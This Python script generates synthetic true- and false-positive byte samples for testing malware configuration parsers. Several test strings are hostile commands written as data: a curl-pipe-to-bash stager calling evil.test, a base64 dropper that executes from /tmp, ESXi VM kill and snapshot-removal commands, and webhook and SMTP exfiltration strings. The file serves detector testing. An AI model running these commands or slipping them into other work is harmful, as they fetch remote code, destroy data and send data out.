#!/usr/bin/env python3
"""
Generate synthetic TP (True Positive) and FP (False Positive) test samples for
mwcp_parsers lab validation.

All samples are synthetic -- they embed the exact structural indicators each parser
uses for detection (wire-format field names, magic bytes, CLI argument shapes) but
contain no actual malware. Run this once before running the parser tests; the pytest
fixture auto-invokes it if samples are absent.

Usage:
    python generate_samples.py
"""
import json
import os
import struct

HERE = os.path.dirname(os.path.abspath(__file__))
TP = os.path.join(HERE, 'samples', 'tp')
FP = os.path.join(HERE, 'samples', 'fp')


def _write(path, data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    with open(path, 'wb') as fh:
        fh.write(data)
    print(f'  {os.path.relpath(path, HERE)} ({len(data)} bytes)')


def _elf64(dynstr_extra=b''):
    """Minimal-but-valid ELF64 header, enough to satisfy elf_dynamic_symbols() callers
    that just check the magic/class before falling through to substring search."""
    return b'\x7fELF' + bytes([2, 1, 1, 0]) + b'\x00' * 8 + b'\x00' * 48


# ---------------------------------------------------------------------------
# TP: c2_frameworks
# ---------------------------------------------------------------------------
def _tp_sliver():
    return (b'{"implant_name": "abc123", "reconnect_interval": 60, '
           b'"c2s": [{"url": "mtls://10.0.0.5:8888"}]}')


def _tp_mythic():
    return (b'{"PayloadUUID": "11111111-2222-3333-4444-555555555555", '
           b'"callback_interval": 10, "c2_profiles": [{"callback_host": "c2.test"}]}')


def _tp_merlin():
    return b'{"psk": "s3cr3t", "maxRetry": 7, "proto": "h2", "url": "https://merlin.test:443"}'


def _tp_havoc():
    block = b'\xde\xad\xbe\xef' + struct.pack('<I', 64) + b'\x00' * 4
    block += struct.pack('<II', 5000, 30)
    return block + b'DemonID\x00SleepTime\x00Injection\x00Teamserver=c2.test:443\x00'


def _tp_adaptix():
    return b'{"agent_id": "abc", "callback_url": "https://adaptix.test", "profile": "http"}'


def _tp_pupy():
    return b'pupy.pupyimporter\x00PupyCredentials\x00rpyc.core\x00server=10.0.0.5:9999\x00'


def _tp_generic_go_c2():
    return (b'Go build ID: "abc123"\x00runtime.goexit\x00'
           b'{"hostname": "victim", "interval": 30, "task_id": "t1"}\x00https://c2.test/beacon')


# ---------------------------------------------------------------------------
# TP: native
# ---------------------------------------------------------------------------
def _mirai_table(key=0x37):
    strings = [b'GETLOCALIP', b'PING', b'REPORT', b'/bin/busybox', b'/dev/watchdog',
              b'KILLATTK', b'watchdog', b'HTTPFLOOD', b'UDPFLOOD', b'SYNFLOOD',
              b'attack.c', b'listener', b'scanner', b'telnet', b'admin', b'root',
              b'123456', b'password', b'default', b'enable', b'shell', b'busybox',
              b'STOMP', b'ACKFLOOD', b'GREIP', b'VSE', b'resolv.conf', b'/proc/net/route',
              b'passwordlist', b'joncrypt', b'anime', b'tcpflood', b'udpflood']
    blob = b'\x00'.join(strings) + b'\x00'
    return bytes(b ^ key for b in blob)


def _tp_bpfdoor():
    return os.urandom(200) + b'\x89\x94\xdd\xed' + os.urandom(200)


def _tp_mirai():
    return os.urandom(1000) + _mirai_table() + os.urandom(1000)


def _tp_ebury():
    # A carve of the trojanised library carries the library's own SONAME alongside the
    # symbol names, which is what identifies the bytes as libkeyutils when the ELF
    # structure itself is too damaged to parse.
    return (b'libkeyutils.so.1\x00keyctl\x00add_key\x00request_key\x00'
           b'connect\x00getaddrinfo\x00socket\x00')


def _tp_xmrig():
    return (b'{"pools": [{"url": "pool.test:3333", "user": "wallet123"}], '
           b'"algo": "rx/0", "donate-level": 1}stratum+tcp://pool.test:3333')


def _tp_smtp_exfil():
    return b'smtp.exfil-test.com\x00587\x00victim@corp.test\x00password:Sup3rSecr3t!'


# ---------------------------------------------------------------------------
# TP: ransomware
# ---------------------------------------------------------------------------
def _tp_esxi_encryptor():
    return (b'esxcli vm process list\x00esxcli vm process kill -t force -w 12\x00'
           b'.vmdk\x00.vmx\x00.vmsn\x00.vswp\x00vim-cmd vmsvc/snapshot.removeall\x00')


def _tp_recovery_inhibition():
    return (b'-----BEGIN PUBLIC KEY-----\x00lvremove -f /dev/vg0/snap1\x00'
           b'zfs destroy -r -f tank@snap\x00')


def _tp_ransomware_generic():
    return (b'-----BEGIN RSA PUBLIC KEY-----\x00'
           b'your files have been encrypted, contact us for decryption key\x00'
           b'abcdefghijklmnop.onion\x00'
           b'.doc\x00.docx\x00.xls\x00.xlsx\x00.pdf\x00.sql\x00.mdb\x00.zip\x00.bak\x00')


def _tp_conti_linux():
    return b'-m all -p /mnt -size 100000 -nomutex -log /tmp/log.txt'


def _tp_blackcat_linux():
    return (b'{"config_id": "abc", "public_key": "xyz", "extension": "alphv", '
           b'"note_file_name": "RECOVER-FILES.txt", "kill_services": ["vmware"], '
           b'"kill_processes": ["vmx"], "exclude_directory_names": ["boot"]}')


# ---------------------------------------------------------------------------
# TP: cloud_saas
# ---------------------------------------------------------------------------
def _tp_telegram():
    return b'https://api.telegram.org/bot123456789:AAHdqTcvCH1vGWJxfSeofSAs0K5PALDsawX/sendMessage'


def _tp_discord():
    wid = '1' * 18
    token = 'A' * 68
    return (f'https://discord.com/api/webhooks/{wid}/{token}\x00'
           f'{{"content": "exfil"}}').encode()


def _tp_slack():
    return b'https://hooks.slack.com/services/T12345678/B12345678/abcdefghijklmnopqrstuvwx'


def _tp_dropbox():
    return b'content.dropboxapi.com/2/files/upload\x00Dropbox-API-Arg: {"path":"/x"}\x00'


def _tp_github():
    return b'api.github.com/repos/x/y/contents/data.txt\x00ghp_' + b'A' * 36


def _tp_pastebin():
    return b'pastebin.com/raw/AbCd1234\x00pastebin.com/api/api_post.php\x00api_dev_key=x\x00'


def _tp_ngrok():
    return b'a1b2c3d4.ngrok-free.app\x00authtoken: xyz\x00tunnels:\x00proto: tcp\x00addr: 4444\x00'


# ---------------------------------------------------------------------------
# TP: delivery
# ---------------------------------------------------------------------------
def _tp_shell_pipeline_stager():
    return b'curl -fsSL https://evil.test/stage2.sh | bash\x00'


def _tp_base64_elf_dropper():
    return b'base64 -d payload.b64 > /tmp/.x\x00chmod +x /tmp/.x\x00/tmp/.x &\x00'


# ---------------------------------------------------------------------------
# TP: specialized
# ---------------------------------------------------------------------------
def _tp_anti_analysis():
    return b'/proc/self/status\x00TracerPid:\x00if (tracerpid != 0) exit(1);\x00'


def _tp_dns_tunnel():
    label = 'A' * 40
    return (f'{label}.exfil.test\x00res_query\x00dn_expand\x00').encode()


# ---------------------------------------------------------------------------
# FP: benign look-alikes
# ---------------------------------------------------------------------------
def _fp_random_noise():
    return os.urandom(4096)


def _fp_plaintext_prose():
    return (b'The quick brown fox jumps over the lazy dog. ' * 200)


def _fp_real_keyutils_shape():
    return b'keyctl\x00add_key\x00request_key\x00keyctl_search\x00keyctl_read\x00'


def _fp_network_tool_shape():
    return b'connect\x00getaddrinfo\x00socket\x00curl_easy_perform\x00curl_easy_init\x00'


def _fp_bpfdoor_generic_strings():
    return b'setsockopt\x00iptable_filter\x00BPF_SOCKET_FILTER\x00' + os.urandom(500)


def _fp_single_json_field():
    return b'{"psk": "x"}{"implant_name": "x"}{"PayloadUUID": "x"}{"agent_id": "x"}'


def _fp_bare_curl_no_pipe():
    return b'curl -s https://example.com/status.json > /tmp/status.json\x00# no pipe to a shell\x00'


def _fp_base64_decode_no_exec():
    return b'base64 -d config.b64 > /etc/app/config.json\x00# config data, never executed\x00'


def _fp_discord_url_no_payload_field():
    wid = '2' * 18
    token = 'B' * 68
    return f'https://discord.com/api/webhooks/{wid}/{token}'.encode()


def _fp_onion_reference_only():
    return b'See our support forum at abcdefghijklmnop.onion for help.\x00'


def _fp_extension_list_benign():
    return b'.doc\x00.docx\x00.xls\x00.xlsx\x00.pdf\x00.sql\x00.mdb\x00.zip\x00.bak\x00'  # backup tool inventory


def _fp_snapshot_command_routine():
    return b'lvremove -f /dev/vg0/old_snap  # weekly backup rotation cron job\x00'


# --- shapes drawn from ordinary content on a running Linux host -------------------------
# The synthetic FP set above is built from what malware looks like with a signal removed.
# These are built from what an uncompromised machine's own files look like, which is the
# corpus a live scan and a memory carve actually run against.

def _fp_case_flipped_prose():
    """Text under XOR 0x20. That key flips ASCII case, so any prose "decodes" into a
    table of words without anything having been obfuscated -- the shape shared by
    docstring blobs in compiled bytecode and by word-list data files."""
    prose = (b'The connection handler validates the supplied identifier before '
             b'establishing a session with the configured endpoint address. '
             b'Returns the resulting status information for the caller. ') * 40
    return bytes(b ^ 0x20 for b in prose)


def _fp_scattered_words_in_binary():
    """Word-shaped runs strewn through binary framing rather than packed into one array:
    the layout of compiled bytecode and resource tables, not of a compile-time string
    table that a lookup routine indexes into."""
    words = [b'connecting', b'identifier', b'information', b'implementation', b'address',
             b'provided', b'contains', b'function', b'reporting', b'correct', b'include',
             b'default', b'session', b'handler', b'validate', b'resulting', b'status',
             b'endpoint', b'configured', b'supplied', b'establish', b'returns']
    out = bytearray()
    for w in words:
        out += os.urandom(200) + b'\x00' + bytes(b ^ 0x20 for b in w) + b'\x00'
    return bytes(out)


def _fp_charset_conversion_table():
    """A strided binary lookup table. Some key XORs part of it into the printable range,
    producing punctuation-laced runs that clear a letters-only ratio test while being
    nothing a program would look up by name."""
    out = bytearray()
    for i in range(3000):
        out += bytes([0x20 + (i % 0x5e), 0x71, 0x20 + ((i * 7) % 0x5e), 0x71, 0x00])
    return bytes(out)


def _fp_multipurpose_lib_strings():
    """A large general-purpose system library holds keyring helper names and links the
    network primitives legitimately. Exceeding a caller's read cap truncates it past the
    point its symbol table can be parsed, so only the strings remain -- and they carry no
    claim to be libkeyutils."""
    return (b'libsystemd-shared-257.so\x00keyctl\x00add_key\x00request_key\x00'
           b'keyring_read\x00key_serial\x00connect\x00getaddrinfo\x00socket\x00'
           b'sd_bus_open\x00sd_event_loop\x00' + os.urandom(400))


def _fp_web_proxy_action_config():
    """A filtering proxy's rule file names mail providers and quotes login query strings.
    The host, a port number and a password-shaped fragment all land within a few hundred
    bytes of each other without any account the pair would authenticate."""
    return (b'{+block-as-image}\n.mail.google.com/mail/\n'
           b'# credible sources are not filtered here\n'
           b'.mail.yahoo.com/config/login?login=&passwd=&pwd=XXX&.persistent=y\n'
           b'.smtp.relay.example.net:587/\n')


def main():
    os.makedirs(TP, exist_ok=True)
    os.makedirs(FP, exist_ok=True)

    print('[TP samples]')
    _write(os.path.join(TP, 'sliver.bin'), _tp_sliver())
    _write(os.path.join(TP, 'mythic.bin'), _tp_mythic())
    _write(os.path.join(TP, 'merlin.bin'), _tp_merlin())
    _write(os.path.join(TP, 'havoc.bin'), _tp_havoc())
    _write(os.path.join(TP, 'adaptix.bin'), _tp_adaptix())
    _write(os.path.join(TP, 'pupy.bin'), _tp_pupy())
    _write(os.path.join(TP, 'generic_go_c2.bin'), _tp_generic_go_c2())
    _write(os.path.join(TP, 'bpfdoor.bin'), _tp_bpfdoor())
    _write(os.path.join(TP, 'mirai.bin'), _tp_mirai())
    _write(os.path.join(TP, 'ebury.bin'), _tp_ebury())
    _write(os.path.join(TP, 'xmrig.bin'), _tp_xmrig())
    _write(os.path.join(TP, 'smtp_exfil.bin'), _tp_smtp_exfil())
    _write(os.path.join(TP, 'esxi_encryptor.bin'), _tp_esxi_encryptor())
    _write(os.path.join(TP, 'recovery_inhibition.bin'), _tp_recovery_inhibition())
    _write(os.path.join(TP, 'ransomware_generic.bin'), _tp_ransomware_generic())
    _write(os.path.join(TP, 'conti_linux.bin'), _tp_conti_linux())
    _write(os.path.join(TP, 'blackcat_linux.bin'), _tp_blackcat_linux())
    _write(os.path.join(TP, 'telegram.bin'), _tp_telegram())
    _write(os.path.join(TP, 'discord.bin'), _tp_discord())
    _write(os.path.join(TP, 'slack.bin'), _tp_slack())
    _write(os.path.join(TP, 'dropbox.bin'), _tp_dropbox())
    _write(os.path.join(TP, 'github.bin'), _tp_github())
    _write(os.path.join(TP, 'pastebin.bin'), _tp_pastebin())
    _write(os.path.join(TP, 'ngrok.bin'), _tp_ngrok())
    _write(os.path.join(TP, 'shell_pipeline_stager.bin'), _tp_shell_pipeline_stager())
    _write(os.path.join(TP, 'base64_elf_dropper.bin'), _tp_base64_elf_dropper())
    _write(os.path.join(TP, 'anti_analysis.bin'), _tp_anti_analysis())
    _write(os.path.join(TP, 'dns_tunnel.bin'), _tp_dns_tunnel())

    print('[FP samples]')
    _write(os.path.join(FP, 'random_noise.bin'), _fp_random_noise())
    _write(os.path.join(FP, 'plaintext_prose.txt'), _fp_plaintext_prose())
    _write(os.path.join(FP, 'real_keyutils_shape.bin'), _fp_real_keyutils_shape())
    _write(os.path.join(FP, 'network_tool_shape.bin'), _fp_network_tool_shape())
    _write(os.path.join(FP, 'bpfdoor_generic_strings.bin'), _fp_bpfdoor_generic_strings())
    _write(os.path.join(FP, 'single_json_field.bin'), _fp_single_json_field())
    _write(os.path.join(FP, 'bare_curl_no_pipe.bin'), _fp_bare_curl_no_pipe())
    _write(os.path.join(FP, 'base64_decode_no_exec.bin'), _fp_base64_decode_no_exec())
    _write(os.path.join(FP, 'discord_url_no_payload_field.bin'), _fp_discord_url_no_payload_field())
    _write(os.path.join(FP, 'onion_reference_only.bin'), _fp_onion_reference_only())
    _write(os.path.join(FP, 'extension_list_benign.bin'), _fp_extension_list_benign())
    _write(os.path.join(FP, 'snapshot_command_routine.bin'), _fp_snapshot_command_routine())
    _write(os.path.join(FP, 'case_flipped_prose.bin'), _fp_case_flipped_prose())
    _write(os.path.join(FP, 'scattered_words_in_binary.bin'), _fp_scattered_words_in_binary())
    _write(os.path.join(FP, 'charset_conversion_table.bin'), _fp_charset_conversion_table())
    _write(os.path.join(FP, 'multipurpose_lib_strings.bin'), _fp_multipurpose_lib_strings())
    _write(os.path.join(FP, 'web_proxy_action_config.bin'), _fp_web_proxy_action_config())

    print('Done.')


if __name__ == '__main__':
    main()
